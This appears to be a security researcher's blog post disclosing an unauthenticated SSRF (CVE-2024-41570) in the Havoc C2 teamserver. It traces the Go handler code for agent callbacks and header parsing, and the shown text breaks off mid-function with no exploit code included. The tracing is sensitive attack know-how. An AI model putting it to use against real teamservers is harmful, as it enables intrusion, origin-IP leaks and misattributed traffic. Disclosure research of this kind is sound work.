<!doctype html>
<html lang="en-us">
  <head>
    <title>Unauthenticated SSRF (CVE-2024-41570) on Havoc C2 teamserver via spoofed demon agent // </title>
    <link rel="shortcut icon" href="/favicon.ico" />
    <meta charset="utf-8" />
    <meta name="generator" content="Hugo 0.140.0">
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="author" content="chebuya" />
    <meta name="description" content="" />
    <link rel="stylesheet" href="/css/main.min.a5031799cdaa4009a95a89643ef8be32c1d9e554e539288ba91b4fcfebcf8035.css" />

    
    
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Unauthenticated SSRF (CVE-2024-41570) on Havoc C2 teamserver via spoofed demon agent">
  <meta name="twitter:description" content="PoC: https://github.com/chebuya/Havoc-C2-SSRF-poc Your browser does not support the video tag. Summary Havoc C2 is a modern and malleable post-exploitation command and control framework targetting windows systems utilized by red teamers and threat actors alike. While auditing the codebase, I was able to discover a vulnerability in which unauthenticated attackers could create a TCP socket on the teamserver with an arbitrary IP/port, and read and write traffic through the socket. By exploiting this vulnerability, attackers could leak the origin IP of a teamserver behind public redirectors (attribution), abuse vulnerable teamservers as a redirector (misattribution) and route traffic through any listening socks proxies on the teamserver.">

    <meta property="og:url" content="https://blog.chebuya.com/posts/server-side-request-forgery-on-havoc-c2/">
  <meta property="og:title" content="Unauthenticated SSRF (CVE-2024-41570) on Havoc C2 teamserver via spoofed demon agent">
  <meta property="og:description" content="PoC: https://github.com/chebuya/Havoc-C2-SSRF-poc Your browser does not support the video tag. Summary Havoc C2 is a modern and malleable post-exploitation command and control framework targetting windows systems utilized by red teamers and threat actors alike. While auditing the codebase, I was able to discover a vulnerability in which unauthenticated attackers could create a TCP socket on the teamserver with an arbitrary IP/port, and read and write traffic through the socket. By exploiting this vulnerability, attackers could leak the origin IP of a teamserver behind public redirectors (attribution), abuse vulnerable teamservers as a redirector (misattribution) and route traffic through any listening socks proxies on the teamserver.">
  <meta property="og:locale" content="en_us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2024-07-13T12:10:52-04:00">
    <meta property="article:modified_time" content="2024-07-13T12:10:52-04:00">


  </head>
  <body>
    <header class="app-header">
    <a href="https://blog.chebuya.com/"><img class="app-header-avatar" src="/avatar.jpg" alt="chebuya" /></a>

      <span class="app-header-title"></span>
      <nav class="app-header-menu">
          <a class="app-header-menu-item" href="/">Home</a>
             - 
          
          <a class="app-header-menu-item" href="/about/">About</a>
      </nav>
      <p> </p>
      <div class="app-header-social">
        
          <a href="https://www.linkedin.com/in/chebuya-%E2%80%8E-5a0a08294/" target="_blank" rel="noreferrer noopener me">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-linkedin">
  <title>LinkedIn</title>
  <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle>
</svg>
          </a>
        
          <a href="https://packetstormsecurity.com/files/author/17026/" target="_blank" rel="noreferrer noopener me">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-spider">
  <title>Exploit-DB</title>
  <path d="M5 9C5 7.89543 5.89543 7 7 7H17C18.1046 7 19 7.89543 19 9V14C19 17.866 15.866 21 12 21V21C8.13401 21 5 17.866 5 14V9Z" stroke="#e33bda" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/><path d="M8 6V5.57546C8 4.59379 8.38443 3.61462 9.32606 3.33713C10.8514 2.88762 13.1486 2.88762 14.6739 3.33713C15.6156 3.61462 16 4.59379 16 5.57546V6" stroke="#e33bda" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/><path d="M18.5 7.5L22 4" stroke="#e33bda" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/><path d="M5.5 7.5L2 4" stroke="#e33bda" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/><path d="M6 18L2 21" stroke="#e33bda" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/><path d="M5 12H1.5" stroke="#e33bda" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/><path d="M22.5 12H19" stroke="#e33bda" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/><path d="M18 18L22 21" stroke="#e33bda" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/><path d="M12 13L12 21" stroke="#e33bda" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
</svg>
          </a>
        
          <a href="https://hackerone.com/chebuya?type=user" target="_blank" rel="noreferrer noopener me">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-hackerone">
  <title>HackerOne</title>
  <path d="M7.207 0c-.4836 0-.8774.1018-1.1823.3002-.3044.2003-.4592.4627-.4592.7798v21.809c0 .2766.1581.5277.4752.7609.315.2335.7031.3501 1.1664.3501.4427 0 .8306-.1166 1.1678-.3501.3352-.231.5058-.4843.5058-.761V1.0815c0-.319-.1623-.5769-.4893-.7813C8.0644.1018 7.6702 0 7.207 0zm9.5234 8.662c-.4836 0-.8717.0981-1.1683.3007l-4.439 2.7822c-.1988.1861-.2841.4687-.2473.855.0342.3826.2108.747.5238 1.0907.3145.346.6662.5626 1.0684.6547.3963.0899.6973.041.8962-.143l1.7551-1.0951v9.7817c0 .2767.1522.5278.4607.761.3007.2335.6873.3501 1.1504.3501.463 0 .863-.1166 1.1983-.3501.3371-.2332.5058-.4843.5058-.761V9.7381c0-.3193-.165-.577-.4898-.7754-.3252-.2026-.7288-.3007-1.2143-.3007z"/>
</svg>
          </a>
        
          <a href="https://github.com/chebuya" target="_blank" rel="noreferrer noopener me">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
  <title>GitHub</title>
  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
</svg>
          </a>
        
          <a href="https://twitter.com/_chebuya" target="_blank" rel="noreferrer noopener me">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-twitter">
  <title>Twitter</title>
  <path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path>
</svg>
          </a>
        
      </div>
    </header>
    <main class="app-container">
      
  <article class="post">
    <header class="post-header">
      <h1 class ="post-title">Unauthenticated SSRF (CVE-2024-41570) on Havoc C2 teamserver via spoofed demon agent</h1>
      <div class="post-meta">
        <div>
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
  <title>calendar</title>
  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
</svg>
          Jul 13, 2024
        </div>
        <div>
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
  <title>clock</title>
  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
</svg>
          20 min read
        </div>
      </div>
    </header>
    <div class="post-content">
      <p>PoC: <a href="https://github.com/chebuya/Havoc-C2-SSRF-poc">https://github.com/chebuya/Havoc-C2-SSRF-poc</a> <!-- raw HTML omitted -->

 

<video width=100% controls autoplay>
    <source src="/havoc-poc.mp4" type="video/mp4">
    Your browser does not support the video tag.
</video>


</p>
<h3 id="summary">Summary</h3>
<p><a href="https://github.com/HavocFramework/Havoc">Havoc C2</a> is <em>a modern and malleable post-exploitation command and control framework</em> targetting windows systems utilized by <a href="https://github.com/WesleyWong420/RedTeamOps-Havoc-101">red teamers</a> and <a href="https://www.fortinet.com/blog/threat-research/malware-disguised-as-document-ukraine-energoatom-delivers-havoc-demon-backdoor">threat actors</a> alike.  While auditing the codebase, I was able to discover a vulnerability in which unauthenticated attackers could create a TCP socket on the teamserver with an arbitrary IP/port, and read and write traffic through the socket.  By exploiting this vulnerability, attackers could leak the origin IP of a teamserver behind public redirectors (attribution), abuse vulnerable teamservers as a redirector (misattribution) and route traffic through any listening socks proxies on the teamserver.</p>
<h3 id="understanding-the-demon-agent-callback-handling">Understanding the demon agent callback handling</h3>
<p>In Havoc, the default agent is called a <em>Demon</em>.  Havoc&rsquo;s malleable design requires that each type of agent has an associated handler, which is backend code responsible for parsing and processing agent callbacks.  The attack surface of these handlers will be exposed when the C2 operators create a <em>listener</em>, which is generally over HTTP/HTTPS.    These listeners will generally be exposed on an associated port (80/443) on the teamserver itself or on a publicly accessible redirector.</p>
<p><img src="/infra.png" alt="meow1"> <!-- raw HTML omitted --></p>
<p>Let&rsquo;s begin by tracing the code flow to the initial demon agent registration</p>
<p>Upon starting of the teamserver or addition of new listeners, the <code>ListenerStart</code> function will configure and start the listeners.  We can see at the bottom of this snippet, a <code>Start()</code> function is called.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">func</span> (<span style="color:#a6e22e">t</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">Teamserver</span>) <span style="color:#a6e22e">ListenerStart</span>(<span style="color:#a6e22e">ListenerType</span> <span style="color:#66d9ef">int</span>, <span style="color:#a6e22e">info</span> <span style="color:#a6e22e">any</span>) <span style="color:#66d9ef">error</span> {
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">...</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">switch</span> <span style="color:#a6e22e">ListenerType</span> {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">case</span> <span style="color:#a6e22e">handlers</span>.<span style="color:#a6e22e">LISTENER_HTTP</span>:
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">HTTPConfig</span> = <span style="color:#a6e22e">handlers</span>.<span style="color:#a6e22e">NewConfigHttp</span>()
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">config</span> = <span style="color:#a6e22e">info</span>.(<span style="color:#a6e22e">handlers</span>.<span style="color:#a6e22e">HTTPConfig</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">HTTPConfig</span>.<span style="color:#a6e22e">Config</span> = <span style="color:#a6e22e">config</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">HTTPConfig</span>.<span style="color:#a6e22e">Config</span>.<span style="color:#a6e22e">Secure</span> = <span style="color:#a6e22e">config</span>.<span style="color:#a6e22e">Secure</span>
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// HTTPConfig.RoutineFunc = Functions
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#a6e22e">HTTPConfig</span>.<span style="color:#a6e22e">Teamserver</span> = <span style="color:#a6e22e">t</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">HTTPConfig</span>.<span style="color:#a6e22e">Start</span>()
</span></span></code></pre></div><p>In the <code>Start()</code> function, we can observe that any POST requests will be mapped to the <code>h.request</code> function.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">func</span> (<span style="color:#a6e22e">h</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">HTTP</span>) <span style="color:#a6e22e">Start</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">logger</span>.<span style="color:#a6e22e">Debug</span>(<span style="color:#e6db74">&#34;Setup HTTP/s Server&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> len(<span style="color:#a6e22e">h</span>.<span style="color:#a6e22e">Config</span>.<span style="color:#a6e22e">Hosts</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">h</span>.<span style="color:#a6e22e">Config</span>.<span style="color:#a6e22e">PortBind</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;&#34;</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">h</span>.<span style="color:#a6e22e">Config</span>.<span style="color:#a6e22e">Name</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;&#34;</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">logger</span>.<span style="color:#a6e22e">Error</span>(<span style="color:#e6db74">&#34;HTTP Hosts/Port/Name not set&#34;</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">h</span>.<span style="color:#a6e22e">GinEngine</span>.<span style="color:#a6e22e">POST</span>(<span style="color:#e6db74">&#34;/*endpoint&#34;</span>, <span style="color:#a6e22e">h</span>.<span style="color:#a6e22e">request</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">...</span>
</span></span></code></pre></div><p>In the <code>h.request</code> function, we can see the post body being read into the <code>Body</code> variable and guardrail checks on the path and User-Agent being performed (these can be obtained by analyzing the demon binary, its traffic or brute forcing them based off public c2 profiles).  If the request passes these checks, the <code>Body</code> variable will be passed to the <code>parseAgentRequest</code> function</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">func</span> (<span style="color:#a6e22e">h</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">HTTP</span>) <span style="color:#a6e22e">request</span>(<span style="color:#a6e22e">ctx</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">gin</span>.<span style="color:#a6e22e">Context</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">ExternalIP</span> <span style="color:#66d9ef">string</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">MissingHdr</span> <span style="color:#66d9ef">string</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">Body</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">ReadAll</span>(<span style="color:#a6e22e">ctx</span>.<span style="color:#a6e22e">Request</span>.<span style="color:#a6e22e">Body</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">logger</span>.<span style="color:#a6e22e">Debug</span>(<span style="color:#e6db74">&#34;Error while reading request: &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">err</span>.<span style="color:#a6e22e">Error</span>())
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">...</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// check that the URI is defined on the profile
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">if</span> len(<span style="color:#a6e22e">h</span>.<span style="color:#a6e22e">Config</span>.<span style="color:#a6e22e">Uris</span>) &gt; <span style="color:#ae81ff">0</span> <span style="color:#f92672">&amp;&amp;</span> ! (len(<span style="color:#a6e22e">h</span>.<span style="color:#a6e22e">Config</span>.<span style="color:#a6e22e">Uris</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">h</span>.<span style="color:#a6e22e">Config</span>.<span style="color:#a6e22e">Uris</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;&#34;</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">valid</span> = <span style="color:#66d9ef">false</span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">for</span> <span style="color:#a6e22e">_</span>, <span style="color:#a6e22e">Uri</span> <span style="color:#f92672">:=</span> <span style="color:#66d9ef">range</span> <span style="color:#a6e22e">h</span>.<span style="color:#a6e22e">Config</span>.<span style="color:#a6e22e">Uris</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">ctx</span>.<span style="color:#a6e22e">Request</span>.<span style="color:#a6e22e">RequestURI</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">Uri</span> {
</span></span><span style="display:flex;"><span>				<span style="color:#a6e22e">valid</span> = <span style="color:#66d9ef">true</span>
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>			}
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">valid</span> <span style="color:#f92672">==</span> <span style="color:#66d9ef">false</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">logger</span>.<span style="color:#a6e22e">Warn</span>(<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Sprintf</span>(<span style="color:#e6db74">&#34;got a request with an invalid request path: %s&#34;</span>, <span style="color:#a6e22e">ctx</span>.<span style="color:#a6e22e">Request</span>.<span style="color:#a6e22e">RequestURI</span>))
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">h</span>.<span style="color:#a6e22e">fake404</span>(<span style="color:#a6e22e">ctx</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// check that the User-Agent is valid
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">h</span>.<span style="color:#a6e22e">Config</span>.<span style="color:#a6e22e">UserAgent</span> <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;&#34;</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">h</span>.<span style="color:#a6e22e">Config</span>.<span style="color:#a6e22e">UserAgent</span> <span style="color:#f92672">!=</span> <span style="color:#a6e22e">ctx</span>.<span style="color:#a6e22e">Request</span>.<span style="color:#a6e22e">UserAgent</span>() {
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">logger</span>.<span style="color:#a6e22e">Warn</span>(<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Sprintf</span>(<span style="color:#e6db74">&#34;got a request with an invalid user agent: %s&#34;</span>, <span style="color:#a6e22e">ctx</span>.<span style="color:#a6e22e">Request</span>.<span style="color:#a6e22e">UserAgent</span>()))
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">h</span>.<span style="color:#a6e22e">fake404</span>(<span style="color:#a6e22e">ctx</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">...</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">Response</span>, <span style="color:#a6e22e">Success</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">parseAgentRequest</span>(<span style="color:#a6e22e">h</span>.<span style="color:#a6e22e">Teamserver</span>, <span style="color:#a6e22e">Body</span>, <span style="color:#a6e22e">ExternalIP</span>); <span style="color:#a6e22e">Success</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">_</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">ctx</span>.<span style="color:#a6e22e">Writer</span>.<span style="color:#a6e22e">Write</span>(<span style="color:#a6e22e">Response</span>.<span style="color:#a6e22e">Bytes</span>())
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">logger</span>.<span style="color:#a6e22e">Debug</span>(<span style="color:#e6db74">&#34;Failed to write to request: &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">err</span>.<span style="color:#a6e22e">Error</span>())
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">h</span>.<span style="color:#a6e22e">fake404</span>(<span style="color:#a6e22e">ctx</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">logger</span>.<span style="color:#a6e22e">Warn</span>(<span style="color:#e6db74">&#34;failed to parse agent request&#34;</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">h</span>.<span style="color:#a6e22e">fake404</span>(<span style="color:#a6e22e">ctx</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">ctx</span>.<span style="color:#a6e22e">AbortWithStatus</span>(<span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">StatusOK</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>In the <code>parseAgentRequest</code> function, we can observe the agent header being parsed out of the POST data (more on how this works below), and subsequent checks for the magic bytes.  The magic bytes are used to determine if the agent callback belongs to a demon agent or a 3rd party agent.  The DEMON_MAGIC_VALUE is 0xdeadbeef, and with that being public we should not have much trouble getting to this point.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">parseAgentRequest</span>(<span style="color:#a6e22e">Teamserver</span> <span style="color:#a6e22e">agent</span>.<span style="color:#a6e22e">TeamServer</span>, <span style="color:#a6e22e">Body</span> []<span style="color:#66d9ef">byte</span>, <span style="color:#a6e22e">ExternalIP</span> <span style="color:#66d9ef">string</span>) (<span style="color:#a6e22e">bytes</span>.<span style="color:#a6e22e">Buffer</span>, <span style="color:#66d9ef">bool</span>) {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">var</span> (
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">Header</span>   <span style="color:#a6e22e">agent</span>.<span style="color:#a6e22e">Header</span>
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">Response</span> <span style="color:#a6e22e">bytes</span>.<span style="color:#a6e22e">Buffer</span>
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">err</span>      <span style="color:#66d9ef">error</span>
</span></span><span style="display:flex;"><span>	)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">Header</span>, <span style="color:#a6e22e">err</span> = <span style="color:#a6e22e">agent</span>.<span style="color:#a6e22e">ParseHeader</span>(<span style="color:#a6e22e">Body</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">logger</span>.<span style="color:#a6e22e">Debug</span>(<span style="color:#e6db74">&#34;[Error] Header: &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">err</span>.<span style="color:#a6e22e">Error</span>())
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">Response</span>, <span style="color:#66d9ef">false</span>
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">Header</span>.<span style="color:#a6e22e">Data</span>.<span style="color:#a6e22e">Length</span>() &lt; <span style="color:#ae81ff">4</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">Response</span>, <span style="color:#66d9ef">false</span>
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// handle this demon connection if the magic value matches
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">Header</span>.<span style="color:#a6e22e">MagicValue</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">agent</span>.<span style="color:#a6e22e">DEMON_MAGIC_VALUE</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">handleDemonAgent</span>(<span style="color:#a6e22e">Teamserver</span>, <span style="color:#a6e22e">Header</span>, <span style="color:#a6e22e">ExternalIP</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// If it&#39;s not a Demon request then try to see if it&#39;s a 3rd party agent.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">handleServiceAgent</span>(<span style="color:#a6e22e">Teamserver</span>, <span style="color:#a6e22e">Header</span>, <span style="color:#a6e22e">ExternalIP</span>)
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Inspecting the <code>ParseHeader</code> function, we can see multiple calls to <code>ParseInt32()</code>.  This function will read 4 bytes of the data in the <code>Parser</code> object, and subsequent calls will read the next 4 bytes of the data.  So the first 4 bytes of the POST body are read into the <code>Header.Size</code> field, bytes[4:8] are read into the <code>Header.MagicValue</code>, and bytes[8:12] are read into the <code>Header.AgentID</code> field.  bytes[12:] are assigned to the <code>Header.Data</code> field.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">ParseHeader</span>(<span style="color:#a6e22e">data</span> []<span style="color:#66d9ef">byte</span>) (<span style="color:#a6e22e">Header</span>, <span style="color:#66d9ef">error</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">var</span> (
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">Header</span> = <span style="color:#a6e22e">Header</span>{}
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">Parser</span> = <span style="color:#a6e22e">parser</span>.<span style="color:#a6e22e">NewParser</span>(<span style="color:#a6e22e">data</span>)
</span></span><span style="display:flex;"><span>	)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">Parser</span>.<span style="color:#a6e22e">Length</span>() &gt; <span style="color:#ae81ff">4</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">Header</span>.<span style="color:#a6e22e">Size</span> = <span style="color:#a6e22e">Parser</span>.<span style="color:#a6e22e">ParseInt32</span>()
</span></span><span style="display:flex;"><span>	} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">Header</span>, <span style="color:#a6e22e">errors</span>.<span style="color:#a6e22e">New</span>(<span style="color:#e6db74">&#34;failed to parse package size&#34;</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">Parser</span>.<span style="color:#a6e22e">Length</span>() &gt; <span style="color:#ae81ff">4</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">Header</span>.<span style="color:#a6e22e">MagicValue</span> = <span style="color:#a6e22e">Parser</span>.<span style="color:#a6e22e">ParseInt32</span>()
</span></span><span style="display:flex;"><span>	} <span style="color:#66d9ef">else</span> {
